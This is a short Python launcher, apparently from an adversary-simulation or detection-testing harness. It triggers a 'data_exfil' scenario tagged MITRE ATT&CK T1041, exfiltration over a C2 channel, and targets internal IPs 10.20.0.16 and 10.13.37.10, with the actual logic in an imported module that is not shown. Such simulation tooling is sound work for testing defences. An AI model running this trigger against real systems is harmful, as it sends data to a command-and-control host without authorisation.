"""python launch_data_exfil.py  -  Exfiltration over C2 channel (T1041 Exfiltration Over C2 Channel)"""
from _trigger import launch

if __name__ == "__main__":
    launch("data_exfil", "Exfiltration over C2 channel", "T1041 Exfiltration Over C2 Channel", "10.20.0.16", "10.13.37.10")
